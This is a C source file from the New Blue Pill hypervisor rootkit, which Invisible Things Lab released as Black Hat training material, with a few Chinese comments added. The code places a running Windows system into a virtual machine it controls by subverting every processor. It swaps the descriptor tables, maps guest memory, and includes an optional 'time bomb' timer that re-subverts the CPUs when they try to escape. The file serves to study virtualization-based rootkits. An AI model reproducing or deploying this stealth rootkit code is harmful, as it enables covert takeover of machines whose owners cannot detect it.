/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "hvm.h"

static KMUTEX g_HvmMutex;

ULONG g_uSubvertedCPUs = 0;
ULONG g_uPrintStuff = 0;
extern BOOLEAN g_bDisableComOutput;

PHVM_DEPENDENT Hvm;

NTSTATUS NTAPI HvmMapGuestVAToSparePage (
  PCPU Cpu,
  PHYSICAL_ADDRESS Context,
  PVOID Source
)
{
  NTSTATUS Status;
  ULONG64 uSourceVA = (ULONG64) Source;
  PHYSICAL_ADDRESS TableEntry;

  if (!Cpu)
    return STATUS_INVALID_PARAMETER;

  // map PML4 page
  if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, Context))) {
    _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", Context.QuadPart,
               Cpu->SparePage, Status));
    return Status;
  }

  TableEntry.QuadPart = ((PULONG64) Cpu->SparePage)[(uSourceVA >> 39) & 0x1ff];
  TableEntry.QuadPart &= 0x000ffffffffff000;

  // map PDP page
  if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, TableEntry))) {
    _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", TableEntry.QuadPart,
               Cpu->SparePage, Status));
    return Status;
  }

  TableEntry.QuadPart = ((PULONG64) Cpu->SparePage)[(uSourceVA >> 30) & 0x1ff];
  TableEntry.QuadPart &= 0x000ffffffffff000;

  // map PDE page
  if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, TableEntry))) {
    _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", TableEntry.QuadPart,
               Cpu->SparePage, Status));
    return Status;
  }

  TableEntry.QuadPart = ((PULONG64) Cpu->SparePage)[(uSourceVA >> 21) & 0x1ff];

  if ((TableEntry.QuadPart & 0x81) == 0x81) {
    // 2mb pde
    TableEntry.QuadPart &= 0x000fffffffe00000;
    TableEntry.QuadPart += uSourceVA & 0x1ff000;

    // map the page
    if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, TableEntry))) {
      _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", TableEntry.QuadPart,
                 Cpu->SparePage, Status));
      return Status;
    }

    return STATUS_SUCCESS;
  }

  TableEntry.QuadPart &= 0x000ffffffffff000;

  // map PTE page
  if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, TableEntry))) {
    _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", TableEntry.QuadPart,
               Cpu->SparePage, Status));
    return Status;
  }

  TableEntry.QuadPart = ((PULONG64) Cpu->SparePage)[(uSourceVA >> 12) & 0x1ff];
  TableEntry.QuadPart &= 0x000ffffffffff000;

  // map the page
  if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, TableEntry))) {
    _KdPrint (("HvmMapGuestVAToSparePage(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", TableEntry.QuadPart,
               Cpu->SparePage, Status));
    return Status;
  }

  return STATUS_SUCCESS;
}

NTSTATUS NTAPI HvmCopyPhysicalToVirtual (
  PCPU Cpu,
  PVOID Destination,
  PHYSICAL_ADDRESS Source,
  ULONG uNumberOfPages
)
{
  ULONG i;
  NTSTATUS Status;

  if (!Cpu || !Destination)
    return STATUS_INVALID_PARAMETER;

  if (!uNumberOfPages)
    return STATUS_SUCCESS;

  for (i = 0; i < uNumberOfPages; i++, Source.QuadPart += PAGE_SIZE) {
    if (!NT_SUCCESS (Status = CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, Source))) {

      _KdPrint (("HvmCopyPhysicalToVirtual(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n", Source.QuadPart,
                 Cpu->SparePage, Status));

      return Status;
    }

    RtlCopyMemory (&((PUCHAR) Destination)[i * PAGE_SIZE], Cpu->SparePage, PAGE_SIZE);
  }

  // restore old SparePage map
  CmPatchPTEPhysicalAddress (Cpu->SparePagePTE, Cpu->SparePage, Cpu->SparePagePA);

  return STATUS_SUCCESS;
}

NTSTATUS NTAPI HvmResumeGuest (
)
{
  _KdPrint (("HvmResumeGuest(): Processor #%d, irql %d in GUEST\n",
             KeGetCurrentProcessorNumber (), KeGetCurrentIrql ()));

  // irql will be lowered in the CmDeliverToProcessor()
  //CmSti();
  return STATUS_SUCCESS;
}

#ifdef BLUE_CHICKEN
static VOID NTAPI HvmTimeBomb (
  PKDPC Dpc,
  PVOID DeferredContext,
  PVOID SystemArgument1,
  PVOID SystemArgument2
)
{
  ULONG uOldSubvertedCPUs, uRetries;

  _KdPrint (("HvmTimeBomb(): Processor #%d, irql %d\n", KeGetCurrentProcessorNumber (), KeGetCurrentIrql ()));

  // irql is DPC already

  uRetries = 10;

  do {
    // be sure that subversion will succeed
    uOldSubvertedCPUs = g_uSubvertedCPUs;
    CmSubvert (NULL);
    uRetries--;
  } while ((uOldSubvertedCPUs == g_uSubvertedCPUs) && uRetries);

}

VOID NTAPI HvmSetupTimeBomb (
  PVOID OriginalTrampoline,
  CCHAR ProcessorNumber
)
{
  PKDPC Dpc;
  PKTIMER Timer;
  LARGE_INTEGER Interval;

  KeSetSystemAffinityThread ((KAFFINITY) (1 << ProcessorNumber));

  _KdPrint (("HvmSetupTimeBomb(): CPU#%d, irql %d\n", KeGetCurrentProcessorNumber (), KeGetCurrentIrql ()));

  Dpc = ExAllocatePoolWithTag (NonPagedPool, sizeof (KDPC), ITL_TAG);
  if (!Dpc) {
    _KdPrint (("HvmSetupTimeBomb(): Failed to allocate KDPC\n"));
    return;
  }

  Timer = ExAllocatePoolWithTag (NonPagedPool, sizeof (KTIMER), ITL_TAG);
  if (!Timer) {
    _KdPrint (("HvmSetupTimeBomb(): Failed to allocate KTIMER\n"));
    return;
  }

  KeInitializeDpc (Dpc, HvmTimeBomb, NULL);
  KeSetTargetProcessorDpc (Dpc, ProcessorNumber);

  Interval.QuadPart = RELATIVE (MILLISECONDS (TIMEBOMB_COUNTDOWN));

  KeInitializeTimer (Timer);
  KeSetTimer (Timer, Interval, Dpc);

  KeRevertToUserAffinityThread ();

  _KdPrint (("HvmSetupTimeBomb(): Set\n"));

  // call the real shutdown trampoline
  ((VOID (*)())OriginalTrampoline) ();

  // never returns
}
#endif

VOID NTAPI HvmEventCallback (
  PCPU Cpu,
  PGUEST_REGS GuestRegs
)
{
  NTSTATUS Status;

  if (!Cpu || !GuestRegs)
    return;

  // FIXME: This should be moved away from the HVM to VMX-specific code!!!
  if (Hvm->Architecture == ARCH_VMX)
    GuestRegs->rsp = VmxRead (GUEST_RSP);

  if (Hvm->ArchIsNestedEvent (Cpu, GuestRegs)) {

    // it's an event of a nested guest
    Hvm->ArchDispatchNestedEvent (Cpu, GuestRegs);

    // FIXME: This should be moved away from the HVM to VMX-specific code!!!
    if (Hvm->Architecture == ARCH_VMX)
      VmxWrite (GUEST_RSP, GuestRegs->rsp);

    return;
  }
  // it's an original event
  Hvm->ArchDispatchEvent (Cpu, GuestRegs);

  // FIXME: This should be moved away from the HVM to VMX-specific code!!!
  if (Hvm->Architecture == ARCH_VMX)
    VmxWrite (GUEST_RSP, GuestRegs->rsp);

  return;
}

static NTSTATUS HvmSetupGdt (
  PCPU Cpu
)
{
  ULONG64 GuestTssBase;
  USHORT GuestTssLimit;
  PSEGMENT_DESCRIPTOR GuestTssDescriptor;

  if (!Cpu || !Cpu->GdtArea)
    return STATUS_INVALID_PARAMETER;

#if DEBUG_LEVEL>2
  CmDumpGdt ((PUCHAR) GetGdtBase (), 0x67);     //(USHORT)GetGdtLimit());
#endif

  // set code and stack selectors the same with NT to simplify our unloading
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 BP_GDT64_CODE,
                 0, 0, LA_STANDARD | LA_DPL_0 | LA_CODE | LA_PRESENT | LA_READABLE | LA_ACCESSED, HA_LONG);

  // we don't want to have a separate segment for DS and ES. They will be equal to SS.
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 BP_GDT64_DATA,
                 0, 0xfffff, LA_STANDARD | LA_DPL_0 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_GRANULARITY | HA_DB);

  // fs
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 KGDT64_R3_CMTEB, 0, 0x3c00, LA_STANDARD | LA_DPL_3 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_DB);

  // gs
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 KGDT64_R3_DATA,
                 0, 0xfffff, LA_STANDARD | LA_DPL_3 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_GRANULARITY | HA_DB);

  GuestTssDescriptor = (PSEGMENT_DESCRIPTOR) (GetGdtBase () + GetTrSelector ());

  GuestTssBase = GuestTssDescriptor->base0 | GuestTssDescriptor->base1 << 16 | GuestTssDescriptor->base2 << 24;
  GuestTssLimit = GuestTssDescriptor->limit0 | (GuestTssDescriptor->limit1attr1 & 0xf) << 16;
  if (GuestTssDescriptor->limit1attr1 & 0x80)
    // 4096-bit granularity is enabled for this segment, scale the limit
    GuestTssLimit <<= 12;

  if (!(GuestTssDescriptor->attr0 & 0x10)) {
    GuestTssBase = (*(PULONG64) ((PUCHAR) GuestTssDescriptor + 4)) & 0xffffffffff000000;
    GuestTssBase |= (*(PULONG32) ((PUCHAR) GuestTssDescriptor + 2)) & 0x00ffffff;
  }
#if DEBUG_LEVEL>2
  CmDumpTSS64 ((PTSS64) GuestTssBase, GuestTssLimit);
#endif

  MmMapGuestTSS64 ((PTSS64) GuestTssBase, GuestTssLimit);

  // don't need to reload TR - we use 0x40, as in xp/vista.
  CmSetGdtEntry (Cpu->GdtArea, BP_GDT_LIMIT, BP_GDT64_SYS_TSS, (PVOID) GuestTssBase, GuestTssLimit,     //BP_TSS_LIMIT,
                 LA_BTSS64 | LA_DPL_0 | LA_PRESENT | LA_ACCESSED, 0);

  // so far, we have 5 GDT entries.
  // 0x10: CODE64         cpl0                                            CS
  // 0x18: DATA           dpl0                                            DS, ES, SS
  // 0x28: DATA           dpl3                                            GS
  // 0x40: Busy TSS64, base is equal to NT TSS    TR
  // 0x50: DATA           dpl3                                            FS

#if DEBUG_LEVEL>2
  CmDumpGdt ((PUCHAR) Cpu->GdtArea, BP_GDT_LIMIT);
#endif

  CmReloadGdtr (Cpu->GdtArea, BP_GDT_LIMIT);

  // set new DS and ES
  CmSetBluepillESDS ();

  // we will use GS as our PCR pointer; GS base will be set to the Cpu in HvmEventCallback
  // FIXME: but it is not?

  return STATUS_SUCCESS;
}

static NTSTATUS HvmSetupIdt (
  PCPU Cpu
)
{
  UCHAR i;

  if (!Cpu || !Cpu->IdtArea)
    return STATUS_INVALID_PARAMETER;

  memcpy (Cpu->IdtArea, (PVOID) GetIdtBase (), 0x1000);

#if 1
  for (i = 0; i < 255; i++)
    CmSetIdtEntry (Cpu->IdtArea, BP_IDT_LIMIT, 0x0d,    // #GP
                   BP_GDT64_CODE, InGeneralProtection, 0, LA_PRESENT | LA_DPL_0 | LA_INTGATE64);
#endif
  CmReloadIdtr (Cpu->IdtArea, BP_IDT_LIMIT);

  return STATUS_SUCCESS;
}

//
NTSTATUS NTAPI HvmSubvertCpu (
  PVOID GuestRsp
)
{
  PCPU Cpu;
  PVOID HostKernelStackBase;
  NTSTATUS Status;
  PHYSICAL_ADDRESS HostStackPA;

  _KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

  if (!Hvm->ArchIsHvmImplemented ()) {
    _KdPrint (("HvmSubvertCpu(): HVM extensions not implemented on this processor\n"));
    return STATUS_NOT_SUPPORTED;
  }

  HostKernelStackBase = MmAllocatePages (HOST_STACK_SIZE_IN_PAGES, &HostStackPA);
  if (!HostKernelStackBase) {
    _KdPrint (("HvmSubvertCpu(): Failed to allocate %d pages for the host stack\n", HOST_STACK_SIZE_IN_PAGES));
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  Cpu = (PCPU) ((PCHAR) HostKernelStackBase + HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE - 8 - sizeof (CPU));
  Cpu->HostStack = HostKernelStackBase;

  // for interrupt handlers which will address CPU through the FS
  Cpu->SelfPointer = Cpu;

  Cpu->ProcessorNumber = KeGetCurrentProcessorNumber ();

  Cpu->Nested = FALSE;

  InitializeListHead (&Cpu->GeneralTrapsList);
  InitializeListHead (&Cpu->MsrTrapsList);
  InitializeListHead (&Cpu->IoTrapsList);

  Cpu->GdtArea = MmAllocatePages (BYTES_TO_PAGES (BP_GDT_LIMIT), NULL);

  if (!Cpu->GdtArea) {
    _KdPrint (("HvmSubvertCpu(): Failed to allocate memory for GDT\n"));
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  Cpu->IdtArea = MmAllocatePages (BYTES_TO_PAGES (BP_IDT_LIMIT), NULL);
  if (!Cpu->IdtArea) {
    _KdPrint (("HvmSubvertCpu(): Failed to allocate memory for IDT\n"));
    return STATUS_INSUFFICIENT_RESOURCES;
  }
  // allocate a 4k page. Fail the init if we can't allocate such page
  // (e.g. all allocations reside on 2mb pages).

  //Cpu->SparePage=MmAllocatePages(1,&Cpu->SparePagePA);
  Cpu->SparePage = MmAllocateContiguousPagesSpecifyCache (1, &Cpu->SparePagePA, MmCached);
  if (!Cpu->SparePage) {
    _KdPrint (("HvmSubvertCpu(): Failed to allocate 1 page for the dummy page (DPA_CONTIGUOUS)\n"));
    return STATUS_UNSUCCESSFUL;
  }
  // this is valid only for host page tables, as this VA may point into 2mb page in the guest.
  Cpu->SparePagePTE = (PULONG64) ((((ULONG64) (Cpu->SparePage) >> 9) & 0x7ffffffff8) + PT_BASE);

#ifdef SVM_SPAREPAGE_NON_CACHED
  *Cpu->SparePagePTE |= (1 << 4);       // set PCD (Cache Disable);
#endif

  Status = Hvm->ArchRegisterTraps (Cpu);
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("HvmSubvertCpu(): Failed to register NewBluePill traps, status 0x%08hX\n", Status));
    return STATUS_UNSUCCESSFUL;
  }

  Status = Hvm->ArchInitialize (Cpu, CmSlipIntoMatrix, GuestRsp);
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("HvmSubvertCpu(): ArchInitialize() failed with status 0x%08hX\n", Status));
    return Status;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);

#if 0
  Cpu->LapicBaseMsr.QuadPart = MsrRead (MSR_IA32_APICBASE);
  if (Cpu->LapicBaseMsr.QuadPart & MSR_IA32_APICBASE_ENABLE) {
    Cpu->LapicPhysicalBase.QuadPart = Cpu->LapicBaseMsr.QuadPart & MSR_IA32_APICBASE_BASE;
    Cpu->LapicVirtualBase = (PVOID) Cpu->LapicPhysicalBase.QuadPart;

    // set VA=PA
    MmCreateMapping (Cpu->LapicPhysicalBase, Cpu->LapicVirtualBase, FALSE);

    _KdPrint (("HvmSubvertCpu(): Local APIC Base PA 0x%08hX, mapped to VA 0x%08hX\n", Cpu->LapicPhysicalBase.QuadPart,
               Cpu->LapicVirtualBase));
  } else {
    _KdPrint (("HvmSubvertCpu(): Local APIC is disabled\n"));
  }
#endif

  // no API calls allowed below this point: we have overloaded GDTR and selectors
#ifdef _X86_

#else
  HvmSetupGdt (Cpu);
  HvmSetupIdt (Cpu);
#endif
#if DEBUG_LEVEL>1
  _KdPrint (("HvmSubvertCpu(): RFLAGS = %#x, CR8 = %#x\n", RegGetRflags (), RegGetCr8 ()));
#endif
  Status = Hvm->ArchVirtualize (Cpu);

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return Status;
}

static NTSTATUS NTAPI HvmLiberateCpu (
  PVOID Param
)
{

#ifndef ENABLE_HYPERCALLS

  return STATUS_NOT_SUPPORTED;

#else

  NTSTATUS Status;
  ULONG64 Efer;
  PCPU Cpu;

  // called at DPC level

  if (KeGetCurrentIrql () != DISPATCH_LEVEL)
    return STATUS_UNSUCCESSFUL;

  Efer = MsrRead (MSR_EFER);

  _KdPrint (("HvmLiberateCpu(): Reading MSR_EFER on entry: 0x%X\n", Efer));

  if (!NT_SUCCESS (Status = HcMakeHypercall (NBP_HYPERCALL_UNLOAD, 0, NULL))) {
    _KdPrint (("HvmLiberateCpu(): HcMakeHypercall() failed on processor #%d, status 0x%08hX\n",
               KeGetCurrentProcessorNumber (), Status));

    return Status;
  }

  Efer = MsrRead (MSR_EFER);
  _KdPrint (("HvmLiberateCpu(): Reading MSR_EFER on exit: 0x%X\n", Efer));

  return STATUS_SUCCESS;
#endif
}

NTSTATUS NTAPI HvmSpitOutBluepill (
)
{

#ifndef ENABLE_HYPERCALLS

  return STATUS_NOT_SUPPORTED;

#else

  CCHAR cProcessorNumber;
  NTSTATUS Status, CallbackStatus;

  g_bDisableComOutput = TRUE;

  _KdPrint (("HvmSpitOutBluepill(): Going to liberate %d processor%s\n",
             KeNumberProcessors, KeNumberProcessors == 1 ? "" : "s"));

  KeWaitForSingleObject (&g_HvmMutex, Executive, KernelMode, FALSE, NULL);

  for (cProcessorNumber = 0; cProcessorNumber < KeNumberProcessors; cProcessorNumber++) {

    _KdPrint (("HvmSpitOutBluepill(): Liberating processor #%d\n", cProcessorNumber));

    Status = CmDeliverToProcessor (cProcessorNumber, HvmLiberateCpu, NULL, &CallbackStatus);

    if (!NT_SUCCESS (Status)) {
      _KdPrint (("HvmSpitOutBluepill(): CmDeliverToProcessor() failed with status 0x%08hX\n", Status));
    }

    if (!NT_SUCCESS (CallbackStatus)) {
      _KdPrint (("HvmSpitOutBluepill(): HvmLiberateCpu() failed with status 0x%08hX\n", CallbackStatus));
    }
  }

  _KdPrint (("HvmSpitOutBluepill(): Finished at irql %d\n", KeGetCurrentIrql ()));

  KeReleaseMutex (&g_HvmMutex, FALSE);
  return STATUS_SUCCESS;
#endif
}

//对当前物理CPU上的所有逻辑CPU，进行虚拟设置，反转到虚拟机的运行状态
NTSTATUS NTAPI HvmSwallowBluepill (
)
{
  CCHAR cProcessorNumber;
  NTSTATUS Status, CallbackStatus;

  _KdPrint (("HvmSwallowBluepill(): Going to subvert %d processor%s\n",
             KeNumberProcessors, KeNumberProcessors == 1 ? "" : "s"));

  KeWaitForSingleObject (&g_HvmMutex, Executive, KernelMode, FALSE, NULL);

  for (cProcessorNumber = 0; cProcessorNumber < KeNumberProcessors; cProcessorNumber++) {

    _KdPrint (("HvmSwallowBluepill(): Subverting processor #%d\n", cProcessorNumber));

    Status = CmDeliverToProcessor (cProcessorNumber, CmSubvert, NULL, &CallbackStatus);

    if (!NT_SUCCESS (Status)) {
      _KdPrint (("HvmSwallowBluepill(): CmDeliverToProcessor() failed with status 0x%08hX\n", Status));
      KeReleaseMutex (&g_HvmMutex, FALSE);

      HvmSpitOutBluepill ();

      return Status;
    }

    if (!NT_SUCCESS (CallbackStatus)) {
      _KdPrint (("HvmSwallowBluepill(): HvmSubvertCpu() failed with status 0x%08hX\n", CallbackStatus));
      KeReleaseMutex (&g_HvmMutex, FALSE);

      HvmSpitOutBluepill ();

      return CallbackStatus;
    }
  }

  KeReleaseMutex (&g_HvmMutex, FALSE);

  if (KeNumberProcessors != g_uSubvertedCPUs) {
    HvmSpitOutBluepill ();
    return STATUS_UNSUCCESSFUL;
  }

  return STATUS_SUCCESS;
}

//分别用AMD65和IA32的实现对当前CPU平台进行识别，并确认是否支持VT技术
NTSTATUS NTAPI HvmInit (
)
{
  BOOLEAN ArchIsOK = FALSE;

  Hvm = &Svm;

  if (Hvm->ArchIsHvmImplemented ()) {
    ArchIsOK = TRUE;
  } else {
    Hvm = &Vmx;
    if (Hvm->ArchIsHvmImplemented ()) {
      ArchIsOK = TRUE;
    }
  }

  if (ArchIsOK == FALSE) {
    _KdPrint (("HvmInit(): %s is not supported\n",
               Hvm->Architecture == ARCH_SVM ? "SVM" : Hvm->Architecture == ARCH_VMX ? "VMX" : "???"));
    return STATUS_NOT_SUPPORTED;
  } else {
    _KdPrint (("HvmInit(): Running on %s\n",
               Hvm->Architecture == ARCH_SVM ? "SVM" : Hvm->Architecture == ARCH_VMX ? "VMX" : "???"));
  }

  KeInitializeMutex (&g_HvmMutex, 0);

  return STATUS_SUCCESS;
}
